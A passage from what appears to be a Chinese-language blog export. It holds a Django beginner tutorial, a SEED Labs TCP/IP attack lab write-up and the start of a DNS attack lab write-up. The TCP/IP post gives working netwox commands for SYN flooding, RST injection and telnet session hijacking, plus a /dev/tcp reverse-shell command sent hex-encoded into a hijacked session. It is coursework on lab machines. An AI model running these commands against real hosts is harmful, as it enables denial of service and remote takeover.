    <url>/2018/01/13/Python%20Django%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>　　Django 是一个 Web 框架，它采用 MTV（Model-Template-View）模型组织，相比其他框架，Django 充分利用 Python 特点，开发效率更高。</p>
<a id="more"></a>
<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>　　这篇博客基于：Python3.6 + PyCharm社区版 + Windows7命令行。使用 pip 安装 Django：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> pip install django</span></div></pre></td></tr></table></figure>
<h4 id="Django开发简单示例"><a href="#Django开发简单示例" class="headerlink" title="Django开发简单示例"></a>Django开发简单示例</h4><ol>
<li>创建工程：<code>django-admin startproject mysite</code></li>
<li>修改工程：<br> 2.1 创建一个具体应用（app）<br> 2.2 修改应用的 views.py：对 URL 的具体响应功能<br> 2.3 修改URL路由：指定 URL 与响应之间的关系</li>
<li>运行测试工程：<code>$ python manage.py runserver</code></li>
</ol>
<h4 id="Django工程"><a href="#Django工程" class="headerlink" title="Django工程"></a>Django工程</h4><h5 id="创建工程"><a href="#创建工程" class="headerlink" title="创建工程"></a>创建工程</h5><p>　　打开 cmd，使用 django-admin 工具创建 Django 工程：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> django-admin startproject mysite</span></div></pre></td></tr></table></figure>
<h5 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.</div><div class="line">├── manage.py</div><div class="line">└── mysite</div><div class="line">    ├── __init__.py</div><div class="line">    ├── settings.py</div><div class="line">    ├── urls.py</div><div class="line">    └── wsgi.py</div></pre></td></tr></table></figure>
<ul>
<li>manage.py</li>
</ul>
<p>　　一个实用的命令行工具，实现以各种方式与该 Django 项目进行交互。</p>
<ul>
<li>__init__.py</li>
</ul>
<p>　　让 Python 把该目录当成一个开发包 (即一组模块)所需的文件。 这是一个空文件，一般你不需要修改它。</p>
<ul>
<li>settings.py</li>
</ul>
<p>　　部署和配置整个工程的配置文件，包含 Django 的设置、配置文件，比如 DEBUG 的开关，静态文件的位置等等。</p>
<ul>
<li>urls.py</li>
</ul>
<p>　　可视其为 Django 网站的目录，URL 路由的声明文件（路由文件），链接入口，关联到对应的 views.py 中的一个函数（或者称作 generic 类），访问的链接就对应一个函数。</p>
<ul>
<li>wsgi.py</li>
</ul>
<p>　　基于 WSGI 的 Web 服务器的配置文件。</p>
<h5 id="django-admin"><a href="#django-admin" class="headerlink" title="django-admin"></a>django-admin</h5><p>　　django-admin 是一个 Django 框架全局的管理工具，它具有以下功能：</p>
<ul>
<li>建立并管理 Django 工程</li>
<li>建立并管理 Django 工程使用的数据库</li>
<li>控制调试或日志信息</li>
<li>运行并维护 Django 工程</li>
</ul>
<p>　　使用示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$  django-admin &lt;command&gt; [options]</div></pre></td></tr></table></figure>
<p>　　查看更多命令可使用帮助：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$  django-admin -help</div></pre></td></tr></table></figure>
<h5 id="manage-py"><a href="#manage-py" class="headerlink" title="manage.py"></a>manage.py</h5><p>　　与 django-admin 类似，但 manage.py 仅针对当前项目。查看更多命令可使用帮助：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> python manage.py <span class="built_in">help</span></span></div></pre></td></tr></table></figure>
<p>　　使用示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> python manage.py &lt;<span class="built_in">command</span>&gt; [options]</span></div><div class="line">or</div><div class="line"><span class="meta">$</span><span class="bash"> python –m django &lt;<span class="built_in">command</span>&gt; [options]</span></div></pre></td></tr></table></figure>
<h5 id="运行工程"><a href="#运行工程" class="headerlink" title="运行工程"></a>运行工程</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> python manage.py runserver</span></div></pre></td></tr></table></figure>
<p>　　打开浏览器，输入 <a href="http://127.0.0.1:8080" target="_blank" rel="external">http://127.0.0.1:8080</a> 即可看到 Django 默认的页面。</p>
<h4 id="Django-应用"><a href="#Django-应用" class="headerlink" title="Django 应用"></a>Django 应用</h4><p>　　工程对应于一个网站，是配置和应用的集合，应用对应于特定功能，是具体功能的载体，配置和功能分离是高度模块化的体现。</p>
<h5 id="创建应用"><a href="#创建应用" class="headerlink" title="创建应用"></a>创建应用</h5><p>　　一般一个项目有多个 app，当然通用的 app 也可以在多个项目中使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt; cd mysite</div><div class="line">&gt; django-admin startapp app</div><div class="line">or</div><div class="line">&gt; python manage.py startapp app</div></pre></td></tr></table></figure>
<h5 id="Django-目录结构"><a href="#Django-目录结构" class="headerlink" title="Django 目录结构"></a>Django 目录结构</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.</div><div class="line">├── app</div><div class="line">│   ├── admin.py</div><div class="line">│   ├── apps.py</div><div class="line">│   ├── __init__.py</div><div class="line">│   ├── migrations</div><div class="line">│   │   └── __init__.py</div><div class="line">│   ├── models.py</div><div class="line">│   ├── tests.py</div><div class="line">│   └── views.py</div></pre></td></tr></table></figure>
<ul>
<li>admin.py</li>
</ul>
<p>　　后台文件，可以用少量的代码就拥有一个强大的后台。</p>
<ul>
<li>apps.py</li>
</ul>
<p>　　App 的配置文件。</p>
<ul>
<li>__init__.py</li>
</ul>
<p>　　让 Python 把该目录当成一个开发包所需的文件。</p>
<ul>
<li>views.py</li>
</ul>
<p>　　包含对某个HTTP请求（url）的响应，用于处理用户发出的请求，从 urls.py 中对应而来，通过渲染 templates 中的网页可以为用户显示页面内容，比如登录后的用户名，用户请求的数据，通过其输出到页面。</p>
<ul>
<li>models.py</li>
</ul>
<p>　　与数据库操作相关，存入或读取数据时使用。当不使用数据库的时候，也可以当做一般的类封装文件，存储各种类的定义。</p>
<h5 id="修改应用"><a href="#修改应用" class="headerlink" title="修改应用"></a>修改应用</h5><ul>
<li>修改应用的 views.py</li>
</ul>
<p>　　views.py 中包含对某个 HTTP 请求（url）的响应，在其中添加以下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</div><div class="line"></div><div class="line"><span class="comment"># 设置处理请求的函数</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(request)</span>:</span></div><div class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'Hello, Welcome!'</span>)</div></pre></td></tr></table></figure>
<ul>
<li>修改工程的 url.py 中的 URL 路由</li>
</ul>
<p>　　在 urls.py 中指定 URL 与处理函数之间的路径关系，在文件中添加指定路由：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</div><div class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</div><div class="line"><span class="keyword">from</span> app <span class="keyword">import</span> views   <span class="comment"># 添加app的views</span></div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    path(<span class="string">'admin/'</span>, admin.site.urls),</div><div class="line">    path(<span class="string">'index/'</span>, views.hello)   <span class="comment"># 添加路由条目</span></div><div class="line">]</div></pre></td></tr></table></figure>
<p>　　注：Pycharm 导入自己写的包时可能会报错，这时候需要在项目目录上右键选择 Mark Directory as，然后选择 Source Root。</p>
<h4 id="运行测试工程"><a href="#运行测试工程" class="headerlink" title="运行测试工程"></a>运行测试工程</h4><p>　　运行 Django：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;</span><span class="bash"> python manage.py runserver</span></div></pre></td></tr></table></figure>
<p>　　使用浏览器访问以下地址：<a href="http://127.0.0.1:8000/index/" target="_blank" rel="external">http://127.0.0.1:8000/index/</a></p>
<p>　　可以看到已经正常显示了：Hello, Welcome!</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Seed Labs: TCP/IP Attack Lab</title>
    <url>/2018/01/12/Seed%20Labs%20TCP%20IP%20Attack%20Lab/</url>
    <content><![CDATA[<p>　　网络与计算机安全课程实验（二），TCP/IP 攻击。</p>
<a id="more"></a>
<h4 id="实验原理与目的"><a href="#实验原理与目的" class="headerlink" title="实验原理与目的"></a>实验原理与目的</h4><p>　　TCP/IP 协议从开始设计时候并没有考虑到现在网络上如此多的威胁，由此导致了许多形形色色的攻击方法。本次实验涉及了 TCP/IP 攻击的三种基本类型，（1）SYN 洪泛攻击，（2）TCP RST 攻击，（3）TCP 会话劫持攻击。希望通过本次实验了解 TCP/IP 攻击的原理，通过实际操作掌握基本的攻击方法，学会如何防范此类攻击。</p>
<h4 id="实验配置"><a href="#实验配置" class="headerlink" title="实验配置"></a>实验配置</h4><p>　　基本配置与上一个实验：Local DNS Attack Lab 基本一致。按照实验指导手册，配置 3 台虚拟机，1 台作为 DNS 服务器，1 台作为用户机，另 1 台作为攻击者，3 台机器通过设置 NAT 网络来实现网络互访。</p>
<p>　　实验资料下载地址：<a href="http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/TCPIP/" target="_blank" rel="external">http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/TCPIP/</a></p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-1.png" alt="12-1"></p>
<h5 id="启用-telnet-服务器"><a href="#启用-telnet-服务器" class="headerlink" title="启用 telnet 服务器"></a>启用 telnet 服务器</h5><p>　　对于本实验，实验要求启用 ftp 和 telnet 服务器，但是其实在后续的实验中只用到了 telnet。为了安全起见， Ubuntu 系统中安装的这些服务通常是默认禁用的，所以需要以 root 用户身份运行以下命令来启用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo service vsftpd start</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo service openbsd-inetd start</span></div></pre></td></tr></table></figure>
<h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h4><h5 id="SYN-洪泛攻击"><a href="#SYN-洪泛攻击" class="headerlink" title="SYN 洪泛攻击"></a>SYN 洪泛攻击</h5><p>　　SYN 洪泛是 DoS 攻击的一种形式，攻击者向受害者的 TCP 端口发送多个 SYN 请求，但是攻击者无意完成三次握手过程。攻击者要么使用欺骗性的 IP 地址，要么不要继续这个过程。通过这种攻击，攻击者可以淹没用于半开连接的受害者队列，即完成 SYN，SYN-ACK 但尚未得到最终 ACK 的连接。当这个队列已满时，受害者不能再进行连接。</p>
<p>　　队列的大小有一个系统范围的设置。在 Linux 中，我们可以使用以下命令检查设置：<br><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sysctl -q net.ipv4.tcp_max_syn_backlog</span></div></pre></td></tr></table></figure></p>
<p>　　我们可以使用命令 “netstat -na” 来检查队列的使用情况，即与监听端口关联的半开连接的数量。这种连接的状态是 SYN-RECV。如果三次握手完成，连接的状态将建立。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-2.png" alt="12-2"></p>
<p>　　Netwox 编号为 76 的工具提供了 SYN 洪泛攻击的基本功能，输入 “netwox 76 –help” 可以获取如下帮助信息。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-3.png" alt="12-3"></p>
<p>　　首先在用户机上使用 telnet 192.168.0.10 命令测试 telnet 连接是否可用，验证可以成功登陆后即退出，然后攻击者开始使用如下命令发起攻击：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo netwox 76 --dst-ip 192.168.0.10 --dst-port 23</span></div></pre></td></tr></table></figure>
<p>　　然后，用户机再次通过 telnet 连接到服务器，此时发现依然可以连接，按照实验指导手册所说，我们需要检查机器是否已经开启 SYN cookie 机制，SYN cookie 是抵御 SYN 洪泛攻击的防御机制。我们可以使用 sysctl 命令查看、打开和关闭 SYN cookie 机制，使用如下命令查看 SYN cookie 机制的设置情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sysctl -a | grep cookie</span></div></pre></td></tr></table></figure>
<p>　　可以看到默认情况下， SYN cookie 机制是启用的，所以先将其关闭后再尝试攻击，使用如下命令将其关闭：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sysctl -w net.ipv4.tcp_syncookies=0</span></div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-4.png" alt="12-4"></p>
<p>　　此时，再次发起攻击，并尝试再次使用 telnet 连接到服务器，发现已经无法连接到服务器了，如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-5.png" alt="12-5"></p>
<p>　　当然，你也可以通过 wireshark 抓包来查看攻击者发送的数据包。实验完成后，再使用如下命令将 SYN cookie 机制打开，以防止 SYN 洪泛攻击。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sysctl -w net.ipv4.tcp_syncookies=1</span></div></pre></td></tr></table></figure>
<h5 id="TCP-RST-攻击-telnet-和-ssh-连接"><a href="#TCP-RST-攻击-telnet-和-ssh-连接" class="headerlink" title="TCP RST 攻击 telnet 和 ssh 连接"></a>TCP RST 攻击 telnet 和 ssh 连接</h5><p>　　RST 表示复位，用来异常的关闭连接，在 TCP 的设计中它是不可或缺的。发送 RST 包关闭连接时，不必等缓冲区的包都发出去，直接就丢弃缓存区的包发送 RST 包。而接收端收到 RST 包后，也不必发送 ACK 包来确认。TCP RST 攻击可以终止两个受害者之间建立的 TCP 连接。例如，如果两个用户 A 和 B 之间建立了 Telnet 连接（TCP），则攻击者可以将 A 到 B 的 RST 数据包进行欺骗，从而破坏现有的连接。为了在这次攻击中取得成功，攻击者需要正确构造 TCP RST 数据包。Netwox 编号为78的工具提供了 RST 攻击的基本功能，输入 “netwox 78 –help” 可以获取如下帮助信息。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-6.png" alt="12-6"></p>
<p>　　在用户机上使用 telnet 命令连接到服务器，登录成功以后，攻击者发起 RST 攻击，通过 netwox 78 号工具伪造 RST 包发送给服务器，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> netwox 78 –i 1921.68.0.10</span></div></pre></td></tr></table></figure>
<p>　　命令运行后悔使得用户机与服务器的 telnet 连接中断，攻击效果如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-7.png" alt="12-7"></p>
<p>　　在用户机上使用 ssh 命令连接到服务器，登录成功以后，攻击者发起 RST 攻击，通过 netwox 78 号工具伪造 RST 包发送给服务器，使得用户机与服务器的 SSH 连接中断，实验效果如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-8.png" alt="12-8"></p>
<h5 id="TCP-RST-攻击视频流应用程序"><a href="#TCP-RST-攻击视频流应用程序" class="headerlink" title="TCP RST 攻击视频流应用程序"></a>TCP RST 攻击视频流应用程序</h5><p>　　实验原理与任务2相同。TCP RST 攻击终会止两个受害者之间建立的 TCP 连接。在用户机上使用浏览器访问优酷的视频，攻击者向用户发起 RST 攻击，再刷新浏览器页面时即显示，为了在这次攻击中取得成功，攻击者需要正确构造 TCP RST 数据包。<br>　　Netwox 编号为 78 的工具提供了 RST 攻击的基本功能攻击命令，通过 netwox 78 号工具伪造 RST 包发送给服务器，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> netwox 78 –i 1921.68.0.100</span></div></pre></td></tr></table></figure>
<p>　　攻击效果如下图，正常观看视频，发起攻击再刷新页面后TCP连接断开，页面崩溃。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-9.png" alt="12-9"></p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-10.png" alt="12-10"></p>
<h5 id="TCP-会话劫持"><a href="#TCP-会话劫持" class="headerlink" title="TCP 会话劫持"></a>TCP 会话劫持</h5><p>　　开启 wireshark，并设置过滤器 –filter telnet，然后开始监控局域网内的流量。用户开始使用 telnet 连接到服务器，分析 telnet 连接建立时发送的数据包，然后根据其特征伪造相应的数据包来劫持会话。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-11.png" alt="12-11"></p>
<p>　　Netwox 编号为 40 的工具提供了 SYN 洪泛攻击的基本功能，输入 “netwox 40 –help” 可以获取如下帮助信息。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-12.png" alt="12-12"></p>
<p>　　使用 netwox 的 40 号工具，根据抓包数据的 TCP 源端口目的端口填写 tcp-src 和 tcp-dst，根据 IP 包的源地址目的地址填写 ip4-src 和 ip4-dst，根据用户机发送给服务器的最后一个数据包的 Next sequence nuber 字段填写 tcp-seqnum，根据服务器发送给用户机的最后一个数据包的 Acknowledgement number 字段填写 tcp-acknum，根据 IP 包的 TTL 字段填写 ip4-ttl，根据 IP 包的协议字段填写 ip4-protocol ，然后根据需要填写 tcp-data 字段。加入我们发送ls命令到服务器来查看该目录下有什么文件，将 ls 转换成 16 进制并加上 \r 的 16 进制数，生成我们的命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.0.100 --ip4-dst 192.168.0.10 --tcp-src 59714 --tcp-dst 23 --tcp-seqnum 3089814629 --tcp-acknum 1471714290 --tcp-ack --tcp-psh --tcp-window 128 --tcp-data <span class="string">"6c730d00"</span></span></div></pre></td></tr></table></figure>
<p>　　通过 wireshark 抓包可以看到命令已经发出，效果如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-13.png" alt="12-13"></p>
<p>　　紧接着，服务器会将该命令的执行结果发送出来，我们同样可以通过抓包查看，如下所示，可以看到 ls 命令的执行结果，即显示该目录下所有文件：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-14.png" alt="12-14"></p>
<h5 id="使用-TCP-会话劫持创建反向-Shell"><a href="#使用-TCP-会话劫持创建反向-Shell" class="headerlink" title="使用 TCP 会话劫持创建反向 Shell"></a>使用 TCP 会话劫持创建反向 Shell</h5><p>　　设置后门的一个典型方法是从受害者机器运行一个反向外壳，以使外壳访问受害者机器。反向shell是在远程机器上运行的一个 shell 进程，连接到攻击者的机器。攻击者一旦遇到危险，就可以方便地访问远程机器。<br>　　netcat 程序允许我们指定一个端口号，并可以监听该端口上的连接。我们可以在攻击者机器上，使用如下命令 netcat 监听端口 9090 上的连接：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> nc –l 9090 -v</span></div></pre></td></tr></table></figure>
<p>　　“/bin/bash -i&gt; /dev/tcp/10.0.2.4/9090 0 &lt;＆1 2&gt;＆1” 会启动一个 bash shell，其输入来自 tcp 连接，其标准错误输出将被重定向到相同的 tcp 连接。将该命令转换成 16 进制，并在最后添加回车的 16 进制代码，即 0x0d00。</p>
<p>　　然后通过上面 3.4 的会话劫持将这个命令发送到服务器，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.0.100 --ip4-dst 192.168.0.10 --tcp-src 53700 --tcp-dst 23 --tcp-seqnum 3862965514 --tcp-acknum 3719047389 --tcp-window 128 --tcp-urgptr 0 --tcp-data <span class="string">"2F62696E2F62617368202D69203E202F6465762F7463702F3139322E3136382E302E3230302F3930393020303C263120323E26310d00"</span></span></div></pre></td></tr></table></figure>
<p>　　通过 wireshark 抓包可以看到数据包已经构造成功，并且发送到服务器。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-15.png" alt="12-15"></p>
<p>　　由于攻击者一直在监听 9090 端口，服务器一旦接收到这个命令就会向攻击者建立连接，从而拿到服务器的 shell，如下图所示 netstat 的输出显示已建立的连接。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/12-16.png" alt="12-16"></p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>Seed Labs</tag>
        <tag>TCP/IP</tag>
      </tags>
  </entry>
  <entry>
    <title>Seed Labs: Local DNS Attack Lab</title>
    <url>/2018/01/11/Seed%20Labs%20Local%20DNS%20Attack%20Lab/</url>
    <content><![CDATA[<p>　　网络与计算机安全课程的实验，使用的是美国雪城大学的开放实验平台：Seed Project。</p>
<a id="more"></a>
<h4 id="实验原理与目的"><a href="#实验原理与目的" class="headerlink" title="实验原理与目的"></a>实验原理与目的</h4><p>　　DNS（域名系统）是因特网上作为域名和 IP 地址相互映射的一个分布式数据库，能够使用户更方便地访问互联网，而不用去记住能够被机器直接读取的IP数串。本次实验涉及三种 DNS 攻击类型，分别是（1）修改用户机器中的 hosts 文件，从而实现 DNS 攻击（2）DNS欺骗，攻击者冒充域名服务器向发送 DNS 查询的机器发送欺骗 DNS 响应。（3）缓存污染，利用控制 DNS 缓存服务器，把原本准备访问某网站的用户在不知不觉中带到黑客指向的其他网站上。实验目的是了解上述 3 种 DNS 攻击的原理，以及 DNS 攻击是如何实现的，然后学会防范这样的攻击。</p>
<h4 id="实验配置"><a href="#实验配置" class="headerlink" title="实验配置"></a>实验配置</h4><p>　　按照实验指导手册，从 SeedProject 的网站上下载 Ubuntu12.04 的镜像，它已经帮我们装好了实验必须的环境以及一些需要用到的软件。该系统默认的用户名是 seed，密码是 dees。</p>
<p>　　实验资料下载地址：<br>　　<a href="http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/DNS_Local/" target="_blank" rel="external">http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/DNS_Local/</a></p>
<p>　　然后，配置 3 台虚拟机，1 台作为 DNS 服务器，1 台作为用户机，另 1 台作为攻击者，3 台机器通过设置 NAT 网络来实现网络互访。一般情况下，可直接复制虚拟机镜像生成三台虚拟机，不过有可能会出错。另外，3 台虚拟机同时打开需要较大的内存，主机内存 4G 的会很卡，8G 的完全没问题。实验示意图如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/11-0.png" alt="11-0"></p>
<h5 id="Vmware配置"><a href="#Vmware配置" class="headerlink" title="Vmware配置"></a>Vmware配置</h5><p>　　SeedProject 提供的是 VirtualBox，但是在这里不建议使用，开源的还是会遇到一些莫名其妙的问题，浪费很多时间在虚拟机环境的配置上不划算。我们应该聚焦实验，所以选择更方便更简单的 VMware。</p>
<p>　　点击菜单栏-》编辑-》编辑虚拟网络，将下面的子网 IP 修改成 192.168.0.0，子网掩码设置成 255.255.255.0，找到 VMnet8 NAT，编辑它，将网关修改成 192.168.0.2，保存即可。</p>
<p>　　为方便操作经常需要在虚拟机和主机之间复制内容，所以需要安装 Wmvare Tools。点击顶部菜单栏的虚拟机，选择重新安装 VMware Tools，将打开的 VMware 文件复制到桌面上并解压，然后打开终端，使用命令进行安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /home/你的用户名/Desktop/VMwareTools版本号.../</span></div><div class="line"><span class="meta">$</span><span class="bash"> ./vmware-install.pl</span></div></pre></td></tr></table></figure>
<p>　　然后一步步安装说明进行操作即可，安装完成后可能需要重启虚拟机。</p>
<h5 id="DNS服务器配置"><a href="#DNS服务器配置" class="headerlink" title="DNS服务器配置"></a>DNS服务器配置</h5><p>　　IP 和 DNS 基本配置：</p>
<ul>
<li>IP 地址：192.168.0.10</li>
<li>子网掩码：255.255.255.0</li>
<li>网关：192.168.0.2</li>
<li>DNS 服务器：114.114.114.114</li>
</ul>
<p>（1）在 DNS 服务器上安装 BIND9，BIND 是一个开源的 DNS 服务器程序。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install bind9</span></div></pre></td></tr></table></figure>
<p>（2）创建 named.conf.options 文件。DNS 服务器需要读取 /etc/bind/named.conf 配置文件才能启动。这个配置文件通常包含一个叫 /etc/bind/named.conf.options 的选项文件，我们添加以下内容用于后续的 DNS 缓存污染实验：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">options &#123;</div><div class="line">dump-file &quot;/var/cache/bind/dump.db&quot;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>文件 /var/cache/bind/dump.db 用于转储 DNS 服务器的缓存。假定我们在服务器中拥有一个域名： example.com，因此我们需要配置关于该域名的一些信息。为避免输入所带来的错误，它建议我们从 SeedProject 网站下载相应的文件放置到 /etc/bind/ 目录下。</p>
<ul>
<li>Zone file for domain example.com: <a href="http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/DNS_Local/example.com.db" target="_blank" rel="external">/var/cache/bind/example.com.db</a></li>
<li>Zone file for DNS reverse lookup: <a href="http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/DNS_Local/192.168.0" target="_blank" rel="external">/var/cache/bind/192.168.0</a></li>
</ul>
<p>（3）启动 DNS 服务器。</p>
<p>　　上述步骤完成后，我们的 DNS 服务器基本就配置完成了，然后我们使用如下命令将其启动：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo /etc/init.d/bind9 restart</span></div><div class="line">or</div><div class="line"><span class="meta">$</span><span class="bash"> sudo service bind9 restart</span></div></pre></td></tr></table></figure>
<h5 id="用户机配置"><a href="#用户机配置" class="headerlink" title="用户机配置"></a>用户机配置</h5><p>　　IP 和 DNS 基本配置：</p>
<ul>
<li>IP 地址：192.168.0.100</li>
<li>子网掩码：255.255.255.0</li>
<li>网关：192.168.0.2</li>
<li>DNS 服务器：192.168.0.10</li>
</ul>
<h5 id="攻击者配置"><a href="#攻击者配置" class="headerlink" title="攻击者配置"></a>攻击者配置</h5><p>　　IP 和 DNS 基本配置：</p>
<ul>
<li>IP 地址：192.168.0.200</li>
<li>子网掩码：255.255.255.0</li>
<li>网关：192.168.0.2</li>
<li>DNS 服务器：114.114.114.114</li>
</ul>
<h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h4><h5 id="修改-host-文件的攻击"><a href="#修改-host-文件的攻击" class="headerlink" title="修改 host 文件的攻击"></a>修改 host 文件的攻击</h5><p>　　该攻击实验假定我们已经获取了受害者机器的账号密码，因此，我们在攻击者机器上通过 ssh 连接到用户机器，然后修改其 /etc/hosts 文件，添加如下一行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">1.2.3.4  www.example.com</div></pre></td></tr></table></figure>
<p>　　然后使用 ping 得到如下图的结果，可以看到该域名对应的 IP 地址已经变更为 1.2.3.4。因为如果用户机器中的 hosts 文件中存在该域名的条目，那么将直接解析该域名为条目中对应的 IP 地址，而不询问任何 DNS 服务器。攻击完成后，用户再使用 ping 时即可看到 www。Example 的地址已经变成1.2.3.4，如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/11-1.png" alt="11-1"></p>
<p>　　注意，这里使用 nslookup 进行查看时是不能看到攻击效果的，因为 nslookup 不会先查本地的 hosts 文件，而是直接向 DNS 服务器发送一个 DNS 查询请求。</p>
<h5 id="欺骗DNS响应"><a href="#欺骗DNS响应" class="headerlink" title="欺骗DNS响应"></a>欺骗DNS响应</h5><p>　　当用户在 Web 浏览器中输入网站域名时，用户计算机将向 DNS 服务器发出 DNS 请求以解析 IP 地址的主机名称。位于同一局域网的攻击者可以监听到这个 DNS 请求，然后在 DNS 服务器返回 DNS 响应之前伪造一个虚假的 DNS 响应发送给 DNS 请求者。当然，DNS 响应需要满足以下要求才会被 DNS 请求者接受：</p>
<ol>
<li>源 IP 地址必须与 DNS 服务器的 IP 地址相匹配。</li>
<li>目标 IP 地址必须与用户机器的 IP 地址相匹配。</li>
<li>源端口号（UDP端口）必须与 DNS 请求发送到的端口号（通常为端口53）相匹配。</li>
<li>目标端口号必须与发送 DNS 请求的端口号相匹配。</li>
<li>UDP 校验和必须正确计算。</li>
<li>交易 ID 必须与 DNS 请求中的交易 ID 匹配。</li>
<li>响应的问题部分中的域名必须与请求的问题部分中的域名相匹配。</li>
<li>响应部分中的域名必须与 DNS 请求的问题部分中的域名匹配。</li>
<li>用户的计算机必须收到攻击者的 DNS 答复，才能收到合法的 DNS 响应。</li>
</ol>
<p>　　Netwox 工具 105 提供了一个实用程序来进行这样的嗅探和响应。攻击者使用 Netwox 工具来监听来自用户机的数据包，并生成一个虚假的 DNS 响应包给 DNS 请求者，即用户机。实验原理示意图如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/1/11-2.png" alt="11-2"></p>
<p>　　Netwox 命令如下：</p>
